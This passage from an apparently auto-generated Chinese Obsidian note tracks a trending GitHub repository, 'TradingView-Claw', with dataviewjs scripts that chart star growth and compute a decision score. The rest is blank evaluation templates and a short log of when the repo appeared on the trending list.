>     lines.push(`\n**成長** +${(last-first).toLocaleString()} stars（${growth}%）in ${points.length} snapshots`);
>     // 趨勢方向偵測
>     if (points.length >= 3) {
>       const mid = Math.floor(points.length / 2);
>       const fh = points.slice(0, mid), sh = points.slice(mid);
>       const rateF = fh.length > 1 ? (fh[fh.length-1].stars - fh[0].stars) / Math.max(1, (new Date(fh[fh.length-1].date) - new Date(fh[0].date)) / 86400000) : 0;
>       const rateS = sh.length > 1 ? (sh[sh.length-1].stars - sh[0].stars) / Math.max(1, (new Date(sh[sh.length-1].date) - new Date(sh[0].date)) / 86400000) : 0;
>       const ratio = rateF > 0 ? rateS / rateF : rateS > 0 ? 2 : 1;
>       const dir = ratio > 1.3 ? "Rising（加速中）" : ratio < 0.7 ? "Cooling（降溫中）" : "Stable（穩定）";
>       lines.push(`**趨勢方向** ${dir}（加速比 ${Math.round(ratio * 100) / 100}x）`);
>     }
>     dv.paragraph(lines.join("\n"));
>   } else { dv.paragraph("需要 2+ 次快照才能顯示趨勢"); }
> } else { dv.paragraph("尚無 star_history 資料（下次出現在 trending 時會開始追蹤）"); }
> ```

## 相對成長速度

> [!abstract]- 跟 vault 中同類專案比較
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> if (me) {
>   const all = dv.pages('"Repos"').where(p => p.status !== "archived");
>   const sameCat = all.where(p => p.category === me.category);
>   const avgAll = all.length > 0 ? Math.round(all.map(p => p.stars_per_day || 0).array().reduce((a,b) => a+b, 0) / all.length) : 0;
>   const avgCat = sameCat.length > 0 ? Math.round(sameCat.map(p => p.stars_per_day || 0).array().reduce((a,b) => a+b, 0) / sameCat.length) : 0;
>   const mySpd = me.stars_per_day || 0;
>   const vsAll = avgAll > 0 ? Math.round(mySpd / avgAll * 100) : 0;
>   const vsCat = avgCat > 0 ? Math.round(mySpd / avgCat * 100) : 0;
>   dv.table(["比較對象", "平均 Stars/天", "本專案", "倍數"], [
>     ["全 Vault", avgAll, mySpd, vsAll + "%"],
>     ["同分類 (" + me.category + ")", avgCat, mySpd, vsCat + "%"],
>   ]);
>   if (vsAll >= 300) dv.paragraph("**極速成長** — 成長速度是 vault 平均的 3 倍以上");
>   else if (vsAll >= 150) dv.paragraph("**高速成長** — 成長速度高於 vault 平均");
>   else if (vsAll >= 50) dv.paragraph("**正常速度** — 接近 vault 平均水平");
>   else dv.paragraph("**低速成長** — 低於 vault 平均，可能已過熱度高峰");
> }
> ```

## 決策分數

> [!abstract]- 綜合評估（自動計算）
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> if (me) {
>   let score = 0;
>   let breakdown = [];
>   // 熱度 (0-25)
>   const spd = me.stars_per_day || 0;
>   const heat = Math.min(25, Math.round(spd / 40 * 25));
>   score += heat; breakdown.push(`熱度: ${heat}/25`);
>   // 安裝難度 (0-20)
>   const inst = me.install_complexity === "easy" ? 20 : me.install_complexity === "medium" ? 12 : 5;
>   score += inst; breakdown.push(`易用性: ${inst}/20`);
>   // 成熟度 (0-20)
>   const created = me.created ? new Date(me.created.toString()) : null;
>   const age = created ? Math.floor((Date.now() - created.getTime()) / 86400000) : 0;
>   const mat = age > 365 ? 20 : age > 180 ? 16 : age > 30 ? 10 : 5;
>   score += mat; breakdown.push(`成熟度: ${mat}/20`);
>   // 社群 (0-20)
>   const forks = me.forks || 0;
>   const comm = forks > 200 ? 20 : forks > 50 ? 15 : forks > 10 ? 10 : 5;
>   score += comm; breakdown.push(`社群: ${comm}/20`);
>   // 授權 (0-15)
>   const lic = me.license || "";
>   const friendly = ["MIT","Apache-2.0","BSD-2-Clause","BSD-3-Clause","ISC","Unlicense"].includes(lic);
>   const licScore = friendly ? 15 : lic && lic !== "N/A" ? 8 : 0;
>   score += licScore; breakdown.push(`授權: ${licScore}/15`);
>   const grade = score >= 80 ? "A" : score >= 60 ? "B" : score >= 40 ? "C" : "D";
>   const bar = "\u2588".repeat(Math.round(score/5)) + "\u2591".repeat(20 - Math.round(score/5));
>   dv.paragraph(`## ${grade} (${score}/100)\n${bar}\n\n${breakdown.join(" | ")}`);
> }
> ```

---

## 個人筆記

> [!abstract]- 評估進度
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> if (me) {
>   const steps = [
>     { name: "已讀", done: me.status && me.status !== "to-review" },
>     { name: "已評分", done: (me.my_rating || 0) > 0 },
>     { name: "有結論", done: me.verdict && me.verdict !== "" },
>     { name: "Ring 決策", done: me.ring && me.ring !== "" && me.ring !== "assess" },
>     { name: "試用記錄", done: me.status === "tried" || me.status === "integrated" },
>   ];
>   const done = steps.filter(s => s.done).length;
>   const pct = Math.round((done / steps.length) * 100);
>   const bar = "\u2588".repeat(Math.round(pct / 5)) + "\u2591".repeat(20 - Math.round(pct / 5));
>   dv.paragraph(`${bar} **${done}/${steps.length}** (${pct}%)`);
>   const todo = steps.filter(s => !s.done).map(s => s.name);
>   if (todo.length > 0) dv.paragraph("待完成：" + todo.join(" / "));
> }
> ```

> [!question]+ 快速評估（30 秒填完）
> 
> 相關性:: 未評估
> 印象:: _一句話_
> 行動:: 不需要
> 
> | 維度 | 分數 (1-5) | 說明 |
> | --- | :---: | --- |
> | 信心 | /5 | _我對這工具的了解程度_ |
> | 興趣 | /5 | _想投入時間研究的程度_ |
> | 風險 | /5 | _導入風險，5=極低風險_ |
> 
> _填完後更新 frontmatter：`score_confidence` / `score_interest` / `score_risk`_
> 
> _相關性選項：直接相關 / 間接相關 / 不相關 / 未評估_
> _行動選項：立刻試用 / 加入待辦 / 持續觀察 / 不需要_

### 試用記錄

> [!example]- 試用 #1
> 試用日期 :: 
> 試用版本 :: 
> 測試環境 :: _OS / Node / Python 版本_
> 安裝過程 :: _順利 / 遇到問題（描述）_
> 花費時間 :: _從零到可用_
> 實際效果 :: _達到預期 / 不如預期（原因）_
> 踩到的坑 :: _描述 + 解法_
> 決定 :: _繼續使用 / 暫時擱置 / 放棄（原因）_

> [!question]- 待研究的問題
> _記下看完後還沒有答案的問題，未來回來補充_
> 
> - [ ] 

### 採用判斷

> [!tip]- 什麼時候該用 / 不該用
> **該用的情況**：
> - 
> 
> **不該用的情況**：
> - 

> [!warning]- 替換成本
> 若半年後要換掉，難度多高？資料格式是標準的嗎？
> 
> 侵入性:: _低 / 中 / 高_
> 遷移路徑:: _描述_

### 決策記錄

> [!abstract]- 為什麼評估這個工具？
> **當時的痛點**：_遇到什麼問題才開始找工具？_
> **觸發來源**：_GitHub Trending / HN / 同事推薦 / 其他_
> **當時的約束**：_時間 / 團隊 / 語言 / 部署環境_

> [!note]- 最終決策
> decision:: _選了什麼（或為何還在觀望）_
> why:: _當時的理由（越具體越好）_
> outcome:: _後來實際發生了什麼_

### 探索日誌

_按時間記錄，每次接觸時追加一段（最新在上）_

> **2026-03-10** — 首次收錄
> _第一印象：_

**狀態追蹤**：`to-review` → `reading` → `tried` → `integrated` / `archived`
**Tech Radar**：`assess` → `trial` → `adopt` / `hold`

> [!info]- 評估完成後
> 更新 frontmatter：
> - `ring`: adopt / trial / assess / hold
> - `ring_history`: 追加新狀態（格式：`assess@2026-03-10, trial@2026-03-15`）
> - `verdict`: 一句話結論
> - `my_rating`: 1-5 分
> - `status`: reading / tried / integrated / archived

## 出現記錄

- [[2026-03-11|2026-03-11]] — 再次上榜，332 stars
- [[2026-03-10|2026-03-10]] — 首次收錄，317 stars
